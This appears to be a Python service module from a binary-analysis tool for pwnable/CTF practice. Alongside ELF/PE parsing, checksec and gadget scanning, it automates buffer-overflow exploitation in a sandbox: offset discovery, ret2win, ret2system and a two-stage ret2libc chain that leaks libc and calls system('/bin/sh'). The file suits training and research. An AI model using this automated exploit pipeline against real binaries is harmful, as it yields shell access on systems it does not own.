"""서비스 계층 — 파싱/분석 코어를 직렬화 가능한 dict 로 감싼다."""

from __future__ import annotations

import hashlib
import logging
import os
import stat
import tempfile
from dataclasses import asdict, dataclass

from pwnable_lab.analyzer.checksec import run_checksec
from pwnable_lab.analyzer.control_flow import ControlFlowAnalyzer
from pwnable_lab.analyzer.core_dump import CoreLimits, analyze_core_dump
from pwnable_lab.analyzer.crash_log import Limits, analyze_crash_log
from pwnable_lab.analyzer.decompile import decompile_function
from pwnable_lab.analyzer.disasm import disassemble
from pwnable_lab.analyzer.entropy import raw_entropy_windows, shannon_entropy
from pwnable_lab.analyzer.gadgets import (
    GadgetFilter,
    filter_gadgets,
    scan_gadgets,
    simulate_chain,
)
from pwnable_lab.analyzer.got_plt import analyze_got_plt
from pwnable_lab.analyzer.strategy import (
    analyze_strategy,
    binary_exec_range,
    find_ret_gadget,
    inject_confirmed_offset,
    leak_plan,
    ret2libc_plan,
    ret2system_plan,
    ret2win_target,
)
from pwnable_lab.analyzer.strings import extract_strings
from pwnable_lab.analyzer.vuln_scan import scan_vulns
from pwnable_lab.config import Settings
from pwnable_lab.elf.parser import ElfImage, parse_elf
from pwnable_lab.errors import AnalysisError
from pwnable_lab.formats import ArtifactFormat, detect_format
from pwnable_lab.payload.pack import RopStep, build_overflow
from pwnable_lab.pe.analyzer import (
    disassemble_pe,
    disassemble_raw,
    pe_checksec,
    raw_checksec,
    scan_pe_imports,
)
from pwnable_lab.pe.parser import parse_pe
from pwnable_lab.sandbox import (
    SandboxLimits,
    confirm_offset_in_container,
    confirm_offset_in_process,
    require_sandbox_boundary,
    require_sandbox_enabled,
    run_two_stage,
    verify_exploit_in_container,
    verify_exploit_in_process,
)
from pwnable_lab.sandbox.libc import resolve_libc_symbols

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class ArtifactInspection:
    format: ArtifactFormat
    machine: str
    bits: int
    verification: str
    evidence: list[str]


class AnalysisService:
    def __init__(self, settings: Settings) -> None:
        self.settings = settings

    def inspect(self, data: bytes) -> ArtifactInspection:
        artifact_format = detect_format(data)
        if artifact_format is ArtifactFormat.ELF:
            elf_image = parse_elf(data)
            return ArtifactInspection(
                artifact_format,
                elf_image.machine,
                elf_image.bits,
                "verified",
                ["ELF magic and complete pyelftools structure validation passed"],
            )
        if artifact_format is ArtifactFormat.PE:
            pe_image = parse_pe(data)
            return ArtifactInspection(
                artifact_format,
                pe_image.machine,
                pe_image.bits,
                "verified",
                ["MZ, PE signature, optional header, and section table validated"],
            )
        return ArtifactInspection(
            artifact_format,
            "UNKNOWN",
            0,
            "unknown",
            ["Bytes passed the raw-binary heuristic; architecture was not inferred"],
        )

    def crash_log(self, text: str) -> dict:
        """Analyze bounded debugger text without executing an attached artifact."""

        return analyze_crash_log(
            text,
            limits=Limits(
                max_lines=self.settings.max_crash_log_lines,
                max_stack_entries=self.settings.max_crash_stack_entries,
            ),
        )

    def core_dump(self, data: bytes) -> dict:
        """Parse a bounded Linux ELF core without loading or executing its target."""

        return analyze_core_dump(
            data,
            limits=CoreLimits(
                max_notes=self.settings.max_core_notes,
                max_note_bytes=self.settings.max_core_note_bytes,
                max_stack_entries=self.settings.max_crash_stack_entries,
            ),
        )

    def image(self, data: bytes) -> ElfImage:
        """Compatibility helper for callers that explicitly require an ELF."""

        self._require_format(data, ArtifactFormat.ELF)
        return parse_elf(data)

    def info(self, data: bytes) -> dict:
        artifact_format = detect_format(data)
        if artifact_format is ArtifactFormat.PE:
            return self._pe_info(data)
        if artifact_format is ArtifactFormat.RAW:
            return self._raw_info(data)
        return self._elf_info(data)

    def elf_info(self, data: bytes) -> dict:
        self._require_format(data, ArtifactFormat.ELF)
        return self._elf_info(data)

    def pe_info(self, data: bytes) -> dict:
        self._require_format(data, ArtifactFormat.PE)
        return self._pe_info(data)

    def _elf_info(self, data: bytes) -> dict:
        img = parse_elf(data)
        return {
            "format": "ELF",
            "sha256": hashlib.sha256(data).hexdigest(),
            "size": len(data),
            "bits": img.bits,
            "endian": img.endian,
            "machine": img.machine,
            "type": img.e_type,
            "entry": img.entry,
            "sections": [asdict(s) for s in img.sections],
            "symbols": [asdict(s) for s in img.symbols],
            "segments": [asdict(s) for s in img.segments],
            "dynamic_symbols": [asdict(s) for s in img.dynamic_symbols],
            "imports": [asdict(s) for s in img.imports],
            "exports": [asdict(s) for s in img.exports],
            "dynamic_tags": img.dynamic_tags,
            "interpreter": img.interpreter,
            "needed_libraries": img.needed_libraries,
            "linked_libc": img.linked_libc,
            "linking": img.linking,
            "soname": img.soname,
            "rpath": img.rpath,
            "runpath": img.runpath,
            "build_id": img.build_id,
            "gnu_properties": img.gnu_properties,
            "relocation_count": len(img.relocations),
            "global_entropy": round(shannon_entropy(data), 4),
        }

    def _pe_info(self, data: bytes) -> dict:
        image = parse_pe(data)
        symbols = [self._pe_export_symbol(item) for item in image.exports]
        dynamic_symbols = [self._pe_import_symbol(item) for item in image.imports]
        sections = [asdict(section) for section in image.sections]
        segments = [self._pe_segment(section) for section in image.sections]
        return {
            "format": "PE",
            "sha256": hashlib.sha256(data).hexdigest(),
            "size": len(data),
            "bits": image.bits,
            "endian": "little",
            "machine": image.machine,
            "type": image.pe_type,
            "file_type": image.file_type,
            "entry": image.entry or None,
            "entry_rva": image.entry_rva,
            "image_base": image.image_base,
            "sections": sections,
            "segments": segments,
            "symbols": symbols,
            "dynamic_symbols": dynamic_symbols,
            "imports": [asdict(item) for item in image.imports],
            "exports": [asdict(item) for item in image.exports],
            "interpreter": None,
            "needed_libraries": image.needed_libraries,
            "linked_libc": None,
            "linking": "dynamic" if image.imports else "unknown",
            "soname": None,
            "rpath": [],
            "runpath": [],
            "build_id": None,
            "gnu_properties": {},
            "relocation_count": len(image.relocations),
            "subsystem": image.subsystem,
            "timestamp": image.timestamp,
            "dll_characteristics": image.dll_characteristics,
            "size_of_image": image.size_of_image,
            "global_entropy": round(shannon_entropy(data), 4),
        }

    def _raw_info(self, data: bytes) -> dict:
        return {
            "format": "RAW",
            "sha256": hashlib.sha256(data).hexdigest(),
            "size": len(data),
            "bits": 0,
            "endian": "unknown",
            "machine": "UNKNOWN",
            "type": "RAW",
            "entry": None,
            "sections": [],
            "segments": [],
            "symbols": [],
            "dynamic_symbols": [],
            "imports": [],
            "exports": [],
            "interpreter": None,
            "needed_libraries": [],
            "linked_libc": None,
            "linking": "unknown",
            "soname": None,
            "rpath": [],
            "runpath": [],
            "build_id": None,
            "gnu_properties": {},
            "relocation_count": 0,
            "global_entropy": round(shannon_entropy(data), 4),
            "analysis_limitations": [
                "Architecture, load address, entry point, and memory permissions are unknown",
                "Disassembly requires explicit user-supplied architecture and base address",
            ],
        }

    def checksec(self, data: bytes) -> dict:
        artifact_format = detect_format(data)
        if artifact_format is ArtifactFormat.ELF:
            result = run_checksec(parse_elf(data)).as_dict()
            result["format"] = "ELF"
            return result
        if artifact_format is ArtifactFormat.PE:
            return pe_checksec(parse_pe(data))
        return raw_checksec()

    def vulns(self, data: bytes) -> list[dict]:
        artifact_format = detect_format(data)
        if artifact_format is ArtifactFormat.PE:
            return scan_pe_imports(parse_pe(data))
        if artifact_format is ArtifactFormat.RAW:
            return []
        return [
            asdict(f)
            for f in scan_vulns(
                parse_elf(data),
                max_instructions=self.settings.max_disasm_instructions,
            )
        ]

    def exploit_strategy(self, data: bytes) -> dict:
        """checksec/vulns/함수/gadget 근거를 종합한 후보 exploit 경로."""

        self._require_format(data, ArtifactFormat.ELF, feature="Exploit strategy")
        return analyze_strategy(
            parse_elf(data),
            max_instructions=self.settings.max_disasm_instructions,
        )

    def confirm_offset(self, data: bytes, *, pattern_length: int | None = None) -> dict:
        """업로드 바이너리를 격리 러너로 실제 실행해 반환 주소 오프셋을 확정한다.

        정적 ``exploit_strategy`` 의 추정 오프셋과 달리, cyclic 패턴을 주입해
        관측된 크래시로부터 역산한 ``verified`` 오프셋을 돌려준다.

        .. warning::
           신뢰할 수 없는 바이너리를 **실행**한다. 기본 비활성이며
           ``PLAB_SANDBOX_EXECUTION_ENABLED=1`` + 격리 컨테이너 경계에서만
           사용해야 한다.
        """

        return self._run_offset_confirmation(
            data,
            pattern_length=pattern_length,
            feature="Dynamic offset confirmation",
        )

    def auto_exploit(self, data: bytes, *, pattern_length: int | None = None) -> dict:
        """정적 전략 + 동적 오프셋 확정을 결합한 exploit 초안 파이프라인.

        1. ``exploit_strategy`` 로 후보 경로와 pwntools 스켈레톤을 만든다(정적).
        2. 격리 러너로 반환 주소 오프셋을 실제 실행으로 확정한다(동적).
        3. 확정된 오프셋을 각 스켈레톤에 주입해 "실행 가능한" 초안으로 승격한다.
        4. ret2win 타깃(win 함수, non-PIE 절대주소)이 있으면 확정 오프셋으로
           payload 를 자동 구성해 익스가 실제로 먹히는지 검증한다(무입력).

        오프셋 확정에 실패하면 정적 스켈레톤을 그대로 두고 ``confirmation`` 에
        관측 근거를 담아 반환한다(예외 아님).
        """

        strategy = self.exploit_strategy(data)
        confirmation = self._run_offset_confirmation(
            data, pattern_length=pattern_length, feature="Auto-exploit"
        )
        verification: dict = {"attempted": False, "reason": "offset-unconfirmed"}
        if confirmation.get("confirmed") and confirmation.get("offset") is not None:
            offset = int(confirmation["offset"])
            strategy = inject_confirmed_offset(
                strategy, offset, method=confirmation.get("method")
            )
            verification = self._auto_verify(data, offset)
        return {
            "strategy": strategy,
            "confirmation": confirmation,
            "verification": verification,
        }

    def _auto_verify(self, data: bytes, offset: int) -> dict:
        """확정 오프셋으로 익스 기법을 순서대로 자동 시도한다(ret2win → ret2system).

        각 시도는 격리 샌드박스에서 실제 payload 를 실행한다. 성공한 첫 기법을
        반환하고, 모두 실패하면 첫 시도를 대표로 두되 ``attempts`` 에 전 시도를
        요약한다. 시도할 기법이 하나도 없으면 ``attempted=false``.
        """

        image = parse_elf(data)
        bits = image.bits or 64
        attempts: list[dict] = []

        win = ret2win_target(image)
        if win is not None:
            attempts.append(self._try_ret2win(data, offset, image, win, bits))
            if attempts[-1]["succeeded"]:
                return self._with_attempts(attempts[-1], attempts)

        plan = ret2system_plan(image)
        if plan is not None:
            attempts.append(self._try_ret2system(data, offset, image, plan, bits))
            if attempts[-1]["succeeded"]:
                return self._with_attempts(attempts[-1], attempts)

        if attempts:
            return self._with_attempts(attempts[0], attempts)
        return {"attempted": False, "reason": "no-technique"}

    @staticmethod
    def _with_attempts(chosen: dict, attempts: list[dict]) -> dict:
        out = dict(chosen)
        if len(attempts) > 1:
            out["attempts"] = [
                {k: a.get(k) for k in ("technique", "succeeded", "reason")}
                for a in attempts
            ]
        return out

    def _try_ret2win(
        self,
        data: bytes,
        offset: int,
        image,
        win: tuple[str, int],
        bits: int,
    ) -> dict:
        """직접 ret2win, 실패 시 amd64 정렬용 ret 가젯으로 한 번 재시도."""

        name, addr = win
        result = self.verify_exploit(data, offset=offset, target=addr, bits=bits)
        alignment = False
        if not result.get("succeeded") and bits == 64:
            ret = find_ret_gadget(image)
            if ret is not None:
                retry = self.verify_exploit(
                    data, offset=offset, target=ret, bits=bits, chain=[addr]
                )
                if retry.get("succeeded"):
                    result, alignment = retry, True
        return {
            "attempted": True,
            "technique": "ret2win",
            "target_name": name,
            "target_addr": addr,
            "target_addr_hex": f"0x{addr:x}",
            "alignment_ret_gadget": alignment,
            "succeeded": result.get("succeeded", False),
            "reason": result.get("reason"),
            "result": result,
        }

    def _try_ret2system(
        self, data: bytes, offset: int, image, plan: dict, bits: int
    ) -> dict:
        """pop rdi → /bin/sh → system 체인이 실제로 system() 으로 제어를 넘기는지 확인.

        비대화형 샌드박스에서는 spawn 된 셸에 명령을 흘려 넣기 어렵고(대상 stdio
        버퍼링), system() 리턴 뒤 복귀주소가 없어 크래시하므로 stdout 마커로
        "셸 획득"을 증명하기 어렵다. 대신 **제어가 바이너리 밖(libc 의 system)으로
        이전**됐는지(크래시 RIP 가 바이너리 실행범위 밖)를 성공 신호로 쓴다.
        정렬(movaps) 때문에 첫 시도가 바이너리 안에서 죽으면 ret 가젯을 끼워 재시도.
        """

        pop_rdi, binsh, system = plan["pop_rdi"], plan["binsh"], plan["system"]
        rng = binary_exec_range(image)

        def reached_system(result: dict) -> bool:
            rip = result.get("observation", {}).get("rip")
            return rip is not None and rng is not None and not (rng[0] <= rip < rng[1])

        chains = [[binsh, system]]
        ret = find_ret_gadget(image)
        if ret is not None:
            chains.append([binsh, ret, system])  # movaps 정렬 변형

        best: dict = {}
        alignment = False
        for i, chain in enumerate(chains):
            result = self.verify_exploit(
                data, offset=offset, target=pop_rdi, chain=chain, bits=bits
            )
            best = result
            if reached_system(result):
                alignment = i > 0
                return self._ret2system_report(
                    plan, alignment, True, "control-into-system", result
                )
        return self._ret2system_report(
            plan, alignment, False, "did-not-reach-system", best
        )

    @staticmethod
    def _ret2system_report(
        plan: dict, alignment: bool, succeeded: bool, reason: str, result: dict
    ) -> dict:
        return {
            "attempted": True,
            "technique": "ret2system",
            "pop_rdi_hex": f"0x{plan['pop_rdi']:x}",
            "binsh_hex": f"0x{plan['binsh']:x}",
            "system_hex": f"0x{plan['system']:x}",
            "alignment_ret_gadget": alignment,
            "succeeded": succeeded,
            "reason": reason,
            "note": (
                "제어가 system() 으로 이전됨(rdi=/bin/sh). 완전한 셸 상호작용은 "
                "대화형 세션이 필요하며 비대화형 샌드박스에서는 증명하지 않는다."
            ),
            "result": result,
        }

    def verify_exploit(
        self,
        data: bytes,
        *,
        offset: int,
        target: int,
        bits: int | None = None,
        chain: list[int] | tuple[int, ...] = (),
        markers: list[str] | tuple[str, ...] = (),
    ) -> dict:
        """구성한 ret2win/ROP payload 를 격리 샌드박스에 주입해 익스 성공을 검증한다.

        ``payload = b'A'*offset + p{bits}(target) + Σ p{bits}(chain)`` 를 실제로
        보내, 크래시 없이 제어가 이전됐는지(또는 ``markers`` 가 stdout 에 나타나는지)
        로 판정한다. ``chain`` 으로 ret2system(pop rdi→/bin/sh→system) 같은 다단계
        ROP 나 정렬용 ret 가젯을 표현할 수 있다.
        """

        require_sandbox_enabled(self.settings)
        self._require_format(data, ArtifactFormat.ELF, feature="Exploit verification")
        resolved_bits = bits or (parse_elf(data).bits or 64)
        logger.warning(
            "sandbox: verifying exploit "
            "(executor=%s, offset=%d, target=0x%x, chain=%d)",
            self.settings.sandbox_executor,
            offset,
            target,
            len(chain),
        )
        executor = (
            verify_exploit_in_container
            if self.settings.sandbox_executor == "container"
            else verify_exploit_in_process
        )
        return executor(
            data,
            offset=offset,
            target=target,
            bits=resolved_bits,
            chain=chain,
            markers=markers,
            settings=self.settings,
        )

    def verify_leak(
        self, data: bytes, *, offset: int, bits: int | None = None
    ) -> dict:
        """puts(puts@got) → exit 체인으로 런타임 libc 주소를 유출한다(amd64).

        ``puts`` 가 GOT 슬롯의 값(런타임 libc 주소)을 출력하고 ``exit`` 로 깨끗이
        종료해 stdio 버퍼를 flush 한다 → 유출 바이트를 stdout 에서 회수한다.
        ASLR 우회(libc base 계산)의 1단계 primitive.
        """

        require_sandbox_enabled(self.settings)
        self._require_format(data, ArtifactFormat.ELF, feature="Libc leak")
        image = parse_elf(data)
        plan = leak_plan(image)
        if plan is None:
            return {"attempted": False, "reason": "no-leak-plan"}
        resolved_bits = bits or image.bits or 64
        result = self.verify_exploit(
            data,
            offset=offset,
            target=plan["pop_rdi"],
            chain=[plan["got_target"], plan["puts_plt"], plan["exit_plt"]],
            bits=resolved_bits,
        )
        leaked = _parse_leaked_address(result)
        ok = leaked is not None and leaked > 0x1000
        return {
            "attempted": True,
            "technique": "libc-leak-puts",
            "got_target_hex": f"0x{plan['got_target']:x}",
            "leaked_addr": leaked,
            "leaked_hex": None if leaked is None else f"0x{leaked:x}",
            "succeeded": ok,
            "reason": "leaked" if ok else "no-leak",
            "result": result,
        }

    def auto_ret2libc(self, data: bytes, *, offset: int) -> dict:
        """완전 자동 2단계 ret2libc: leak → libc base 계산 → system("/bin/sh").

        1. `A*off + pop_rdi + puts@got + puts@plt + <재진입>` 로 런타임 puts 유출.
        2. `libc_base = leaked - puts_offset` (실행 환경의 libc 심볼 오프셋 사용).
        3. `A*off + pop_rdi + binsh + ret + system` 로 되쏘아 system 호출.

        libc 가 다른 컨테이너 executor 에서는 미지원(콜백 기반 2단계 러너가 무상태
        CLI 로 노출돼 있지 않음) — in-process 경로 전용.
        """

        require_sandbox_boundary(self.settings)
        self._require_format(data, ArtifactFormat.ELF, feature="Auto ret2libc")
        if self.settings.sandbox_executor == "container":
            return {"attempted": False, "reason": "inprocess-only"}

        image = parse_elf(data)
        bplan = ret2libc_plan(image)
        if bplan is None:
            return {"attempted": False, "reason": "no-ret2libc-plan"}
        libc = resolve_libc_symbols()
        if libc is None:
            return {"attempted": False, "reason": "no-libc-symbols"}

        pop, ret = bplan["pop_rdi"], bplan["ret"]
        prelude = (
            build_overflow(
                offset,
                pop,
                bits=64,
                chain=[
                    RopStep(bplan["puts_got"]),
                    RopStep(bplan["puts_plt"]),
                    RopStep(bplan["return_to"]),
                ],
            )
            + b"\n"
        )
        captured: dict = {}

        def make_second(first_line: bytes) -> bytes:
            leaked = int.from_bytes(first_line[:6], "little")
            base = leaked - libc["puts"]
            captured.update(leaked=leaked, base=base)
            return (
                build_overflow(
                    offset,
                    pop,
                    bits=64,
                    chain=[
                        RopStep(base + libc["binsh"]),
                        RopStep(ret),
                        RopStep(base + libc["system"]),
                    ],
                )
                + b"\n"
            )

        limits = SandboxLimits(
            wall_seconds=self.settings.sandbox_wall_seconds,
            cpu_seconds=self.settings.sandbox_cpu_seconds,
            address_space_bytes=self.settings.sandbox_address_space_bytes,
        )
        logger.warning("sandbox: auto ret2libc (offset=%d)", offset)
        path = self._materialize(data)
        try:
            observation, _leaked_line = run_two_stage(
                path, make_second, prelude=prelude, limits=limits
            )
        finally:
            try:
                os.unlink(path)
            except OSError:
                pass

        base = captured.get("base")
        rng = binary_exec_range(image)
        rip = observation.rip
        reached_libc = (
            rip is not None and rng is not None and not (rng[0] <= rip < rng[1])
        )
        # libc base 가 페이지 정렬이면 leak/오프셋 계산이 정확하다는 강한 신호.
        base_ok = base is not None and base > 0 and base % 0x1000 == 0
        succeeded = bool(base_ok and reached_libc)
        return {
            "attempted": True,
            "technique": "ret2libc",
            "libc_path": libc["path"],
            "leaked_puts": captured.get("leaked"),
            "leaked_puts_hex": (
                None
                if captured.get("leaked") is None
                else f"0x{captured['leaked']:x}"
            ),
            "libc_base": base,
            "libc_base_hex": None if base is None else f"0x{base:x}",
            "libc_base_page_aligned": base_ok,
            "reached_libc": reached_libc,
            "return_to": bplan["return_to_name"],
            "succeeded": succeeded,
            "reason": "control-into-system" if succeeded else "did-not-reach-system",
            "observation": observation.as_dict(),
        }

    @staticmethod
    def _materialize(data: bytes) -> str:
        fd, path = tempfile.mkstemp(prefix="plab-sbx-")
        with os.fdopen(fd, "wb") as fh:
            fh.write(data)
        os.chmod(path, stat.S_IRWXU)
        return path

    def _run_offset_confirmation(
        self, data: bytes, *, pattern_length: int | None, feature: str
    ) -> dict:
        """게이트/포맷 검증 후 설정된 executor 로 오프셋 확정을 수행한다."""

        # 마스터 게이트(활성화 여부)는 항상 API 계층에서 검증 → 비활성 시 503.
        # 격리 마커는 "실제 실행이 일어나는 곳"에서 확인한다: in-process 는
        # executor 내부에서, container 는 컨테이너 안의 CLI 가 검증한다.
        require_sandbox_enabled(self.settings)
        self._require_format(data, ArtifactFormat.ELF, feature=feature)

        length = pattern_length or self.settings.sandbox_pattern_length
        logger.warning(
            "sandbox: confirming offset for untrusted binary "
            "(executor=%s, pattern_length=%d)",
            self.settings.sandbox_executor,
            length,
        )
        if self.settings.sandbox_executor == "container":
            return confirm_offset_in_container(
                data, pattern_length=length, settings=self.settings
            )
        return confirm_offset_in_process(
            data, pattern_length=length, settings=self.settings
        )

    def pseudo_c(self, data: bytes, *, address: int) -> dict:
        """단일 함수의 규칙 기반 pseudo-C 초안."""

        analyzer = self._control_flow(data)
        detail = analyzer.function_detail(
            address,
            max_instructions=self.settings.max_disasm_instructions,
        )
        names = {addr: names[0] for addr, names in analyzer.symbols.items() if names}
        return decompile_function(detail, bits=analyzer.bits, names=names)

    def gadgets(
        self,
        data: bytes,
        *,
        filters: GadgetFilter,
        offset: int,
        limit: int,
    ) -> dict:
        self._require_format(data, ArtifactFormat.ELF, feature="ROP gadget scan")
        img = parse_elf(data)
        scan = scan_gadgets(
            img,
            max_gadgets=self.settings.max_gadgets,
            max_depth=self.settings.max_gadget_depth,
        )
        gadgets = filter_gadgets(
            scan.gadgets,
            filters,
            bits=img.bits,
            endian=img.endian,
        )
        result = _page(
            [gadget.as_dict() for gadget in gadgets], offset=offset, limit=limit
        )
        result.update(
            {
                "format": "ELF",
                "bits": img.bits,
                "status": "partially_completed" if scan.truncated else "completed",
                "verification": "verified",
                "quality_verification": "inferred",
                "position_independent": scan.position_independent,
                "image_base": scan.image_base,
                "scanned_gadgets": len(scan.gadgets),
                "executable_sections": scan.executable_sections,
                "filters": asdict(filters),
                "evidence": [
                    "Every result exactly decodes from file-backed executable ELF bytes",
                    "Register and memory access metadata comes from Capstone instruction detail",
                ],
                "limitations": [
                    "Scans ret, ret-imm, syscall, int 0x80, and indirect "
                    "jmp/call reg or [mem] (JOP/COP) terminators",
                    "Quality scores are ranking heuristics and do not prove runtime usability",
                ],
            }
        )
        return result

    def simulate_rop(self, data: bytes, *, items: list[dict], rsp_mod16: int) -> dict:
        self._require_format(data, ArtifactFormat.ELF, feature="ROP chain simulation")
        img = parse_elf(data)
        scan = scan_gadgets(
            img,
            max_gadgets=self.settings.max_gadgets,
            max_depth=self.settings.max_gadget_depth,
        )
        return simulate_chain(
            scan.gadgets,
            items,
            bits=img.bits,
            position_independent=scan.position_independent,
            initial_rsp_mod16=rsp_mod16,
        )

    def got_plt(self, data: bytes) -> dict:
        self._require_format(data, ArtifactFormat.ELF, feature="GOT/PLT analysis")
        return analyze_got_plt(parse_elf(data)).as_dict()

    def symbols(
        self,
        data: bytes,
        *,
        kind: str,
        offset: int,
        limit: int,
    ) -> dict:
        artifact_format = detect_format(data)
        if artifact_format is ArtifactFormat.PE:
            pe_image = parse_pe(data)
            if kind == "imports":
                pe_symbols = [self._pe_import_symbol(item) for item in pe_image.imports]
            elif kind in {"exports", "functions", "static"}:
                pe_symbols = [self._pe_export_symbol(item) for item in pe_image.exports]
            elif kind == "dynamic":
                pe_symbols = [self._pe_import_symbol(item) for item in pe_image.imports]
            else:
                pe_symbols = [
                    *[self._pe_export_symbol(item) for item in pe_image.exports],
                    *[self._pe_import_symbol(item) for item in pe_image.imports],
                ]
            return _page(pe_symbols, offset=offset, limit=limit)
        if artifact_format is ArtifactFormat.RAW:
            return _page([], offset=offset, limit=limit)
        elf_image = parse_elf(data)
        if kind == "static":
            elf_symbols = elf_image.symbols
        elif kind == "dynamic":
            elf_symbols = elf_image.dynamic_symbols
        elif kind == "imports":
            elf_symbols = elf_image.imports
        elif kind == "exports":
            elf_symbols = elf_image.exports
        elif kind == "functions":
            elf_symbols = [
                symbol
                for symbol in elf_image.symbols + elf_image.dynamic_symbols
                if symbol.defined and symbol.stype == "STT_FUNC"
            ]
        else:
            elf_symbols = elf_image.symbols + elf_image.dynamic_symbols
        normalized = [asdict(symbol) for symbol in elf_symbols]
        return _page(normalized, offset=offset, limit=limit)

    def functions(
        self,
        data: bytes,
        *,
        query: str | None,
        offset: int,
        limit: int,
    ) -> dict:
        analyzer = self._control_flow(data)
        functions, truncated = analyzer.functions(
            max_instructions=self.settings.max_disasm_instructions
        )
        normalized = [asdict(item) for item in functions]
        if query:
            needle = query.strip().lower()
            normalized = [
                item
                for item in normalized
                if needle in item["name"].lower()
                or any(needle in alias.lower() for alias in item["aliases"])
                or needle in f"0x{item['address']:x}"
            ]
        result = _page(normalized, offset=offset, limit=limit)
        result.update(
            {
                "format": analyzer.artifact_format,
                "status": "partially_completed" if truncated else "completed",
                "verification": "inferred",
                "evidence": [
                    "Function starts combine verified symbols/entry points and inferred direct-call targets",
                    "Function boundaries without a valid symbol size are inferred from the next start or region end",
                ],
            }
        )
        return result

    def function_detail(self, data: bytes, *, address: int) -> dict:
        return self._control_flow(data).function_detail(
            address,
            max_instructions=self.settings.max_disasm_instructions,
        )

    def cfg(self, data: bytes, *, address: int) -> dict:
        return self._control_flow(data).cfg(
            address,
            max_instructions=self.settings.max_disasm_instructions,
        )

    def xrefs(
        self,
        data: bytes,
        *,
        address: int | None,
        direction: str,
        kind: str,
        offset: int,
        limit: int,
    ) -> dict:
        analyzer = self._control_flow(data)
        xrefs, truncated = analyzer.xrefs(
            address=address,
            direction=direction,
            kind=kind,
            max_instructions=self.settings.max_disasm_instructions,
        )
        result = _page([asdict(item) for item in xrefs], offset=offset, limit=limit)
        result.update(
            {
                "format": analyzer.artifact_format,
                "direction": direction,
                "kind": kind,
                "status": "partially_completed" if truncated else "completed",
                "verification": "verified",
                "limitations": [
                    "Only direct branch immediates and x86 RIP-relative memory references are resolved"
                ],
            }
        )
        return result

    def relocations(self, data: bytes, *, offset: int, limit: int) -> dict:
        artifact_format = detect_format(data)
        if artifact_format is ArtifactFormat.PE:
            relocations = [asdict(item) for item in parse_pe(data).relocations]
        elif artifact_format is ArtifactFormat.ELF:
            relocations = [asdict(item) for item in parse_elf(data).relocations]
        else:
            relocations = []
        return _page(relocations, offset=offset, limit=limit)

    def got_entries(self, data: bytes, *, offset: int, limit: int) -> dict:
        self._require_format(data, ArtifactFormat.ELF, feature="GOT analysis")
        report = analyze_got_plt(parse_elf(data))
        result = report.as_dict()
        entries = result.pop("entries")
        result["entries"] = entries[offset : offset + limit]
        result["pagination"] = {
            "total": len(entries),
            "offset": offset,
            "limit": limit,
        }
        return result

    def plt_entries(self, data: bytes, *, offset: int, limit: int) -> dict:
        self._require_format(data, ArtifactFormat.ELF, feature="PLT analysis")
        report = analyze_got_plt(parse_elf(data))
        entries = [asdict(entry) for entry in report.plt_entries]
        return _page(entries, offset=offset, limit=limit)

    def libraries(self, data: bytes) -> dict:
        artifact_format = detect_format(data)
        if artifact_format is ArtifactFormat.PE:
            pe_image = parse_pe(data)
            return {
                "format": "PE",
                "linking": "dynamic" if pe_image.imports else "unknown",
                "interpreter": None,
                "needed": pe_image.needed_libraries,
                "linked_libc": None,
                "soname": None,
                "rpath": [],
                "runpath": [],
                "verification": "verified",
                "source": "PE import directory",
                "confidence": 1.0,
            }
        if artifact_format is ArtifactFormat.RAW:
            return {
                "format": "RAW",
                "linking": "unknown",
                "interpreter": None,
                "needed": [],
                "linked_libc": None,
                "soname": None,
                "rpath": [],
                "runpath": [],
                "verification": "unknown",
                "source": "No recognized loader metadata",
                "confidence": 1.0,
            }
        elf_image = parse_elf(data)
        return {
            "format": "ELF",
            "linking": elf_image.linking,
            "interpreter": elf_image.interpreter,
            "needed": elf_image.needed_libraries,
            "linked_libc": elf_image.linked_libc,
            "soname": elf_image.soname,
            "rpath": elf_image.rpath,
            "runpath": elf_image.runpath,
            "verification": "verified",
            "source": "ELF program headers and dynamic tags",
            "confidence": 1.0,
        }

    def analysis_summary(self, data: bytes, binary_id: str) -> dict:
        artifact_format = detect_format(data)
        info = self.info(data)
        checksec = self.checksec(data)
        summary_key = artifact_format.value.lower()
        summary = {
            "sha256": binary_id,
            "size": len(data),
            "format": artifact_format.value,
            "bits": info["bits"],
            "endian": info["endian"],
            "machine": info["machine"],
            "type": info["type"],
            "entry": info["entry"],
            "linking": info["linking"],
            "needed_libraries": info["needed_libraries"],
            "section_count": len(info["sections"]),
            "segment_count": len(info["segments"]),
            "symbol_count": len(info["symbols"]) + len(info["dynamic_symbols"]),
            "import_count": len(info.get("imports", [])),
            "export_count": len(info.get("exports", [])),
            "relocation_count": info["relocation_count"],
            "global_entropy": info["global_entropy"],
        }
        if artifact_format is ArtifactFormat.ELF:
            image = parse_elf(data)
            got_plt = analyze_got_plt(image)
            summary.update(
                {
                    "interpreter": image.interpreter,
                    "linked_libc": image.linked_libc,
                    "build_id": image.build_id,
                    "got_entry_count": len(got_plt.got_entries),
                    "plt_entry_count": len(got_plt.plt_entries),
                    "import_count": len(image.imports),
                    "export_count": len(image.exports),
                }
            )
        return {
            "verification": (
                "unknown" if artifact_format is ArtifactFormat.RAW else "verified"
            ),
            "source": (
                "raw byte heuristics"
                if artifact_format is ArtifactFormat.RAW
                else "validated static executable parser"
            ),
            "confidence": 0.55 if artifact_format is ArtifactFormat.RAW else 1.0,
            "format": artifact_format.value,
            summary_key: summary,
            "checksec": checksec,
        }

    def entropy(self, data: bytes) -> dict:
        artifact_format = detect_format(data)
        if artifact_format is ArtifactFormat.ELF:
            image = parse_elf(data)
            regions = [
                {
                    "name": section.name,
                    "offset": section.offset,
                    "size": section.size,
                    "entropy": round(
                        shannon_entropy(
                            data[section.offset : section.offset + section.size]
                        ),
                        4,
                    ),
                    "executable": section.executable,
                    "writable": section.writable,
                    "verification": "verified",
                }
                for section in image.sections
                if section.size
            ]
        elif artifact_format is ArtifactFormat.PE:
            regions = [
                {
                    "name": section.name,
                    "offset": section.offset,
                    "size": section.size,
                    "entropy": section.entropy,
                    "executable": section.executable,
                    "writable": section.writable,
                    "verification": "verified",
                }
                for section in parse_pe(data).sections
                if section.size
            ]
        else:
            regions = raw_entropy_windows(data)
        return {
            "format": artifact_format.value,
            "global_entropy": round(shannon_entropy(data), 4),
            "regions": regions,
            "interpretation": "Entropy is evidence only and never confirms packing by itself.",
            "verification": "verified",
        }

    def strings(self, data: bytes, min_length: int = 4) -> list[dict]:
        strings = extract_strings(
            data, min_length=min_length, max_strings=self.settings.max_strings
        )
        return [asdict(s) for s in strings]

    def disassembly(
        self,
        data: bytes,
        address: int | None,
        count: int,
        *,
        architecture: str | None = None,
